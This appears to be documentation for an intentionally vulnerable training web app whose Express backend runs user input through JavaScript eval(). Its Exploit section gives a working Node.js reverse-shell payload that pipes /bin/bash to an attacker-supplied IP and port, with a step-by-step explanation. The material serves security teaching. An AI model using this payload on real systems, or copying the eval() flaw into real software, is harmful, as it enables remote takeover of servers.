# Documentation
## Frontend
The Frontend was made with the Vue3 Framework and Element Plus UI library.  
It's only purpose is to send the user input to the backend.  
To simplify the REST communication the axios library was used.  
### UI
The UI is designed to immediately show the user what backend vulnerabilities are to be expected.  
>![](doc/assets/frontend.png)  
To the user it's presented as a site to return a greeting of their choice.  
There are multiple hints on the page, for example that the backend will evaluate the text (JavaScript eval() vulnerability)   or the popover that states that the string needs to be encased with quotation marks. This leads the user to knowing that its some kind of remote code execution vulnerability.  
### Usage
>When the user imputs the string with quotation marks, the backend will return the greeting.  
![](doc/assets/frontend2.png)  

>Otherwise the user will find an error in the console stating that the imput (in this case World) is not defined.  
This shows that the backend is vulnerable to a remote code execution vulnerability.  
![](doc/assets/frontend3.png)  

## Backend
The backend was made with the Express Framework and NodeJS.
For the backend we modified an existing example to make it fit for our needs.
### <ins>Vulnerability</ins>
The backend is vulnerable to a remote code execution vulnerability through the eval() function by that the backend will try to execute the user input as JavaScript code.  
So for example if the user inputs `console.log("Hello World")` the backend will log `Hello World` to the console.

### <ins>Exploit</ins>
If you input the following code in the frontend, you will get a reverse shell to your machine, as the will execute the code within the eval() function.
``` JavaScript
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
>As import statements will not work with the eval() function the require() function is needed to import the net and child_process modules.  
The net module is used to create a socket and the child_process module is used to execute the bash shell.  
The socket is then connected to the port you are listening on and the bash shell is executed.
All the output of the shell is then piped to the socket and all the input from the socket is piped to the shell.
By this we can execute commands from our own machine on the backend machine as the user that is running the backend.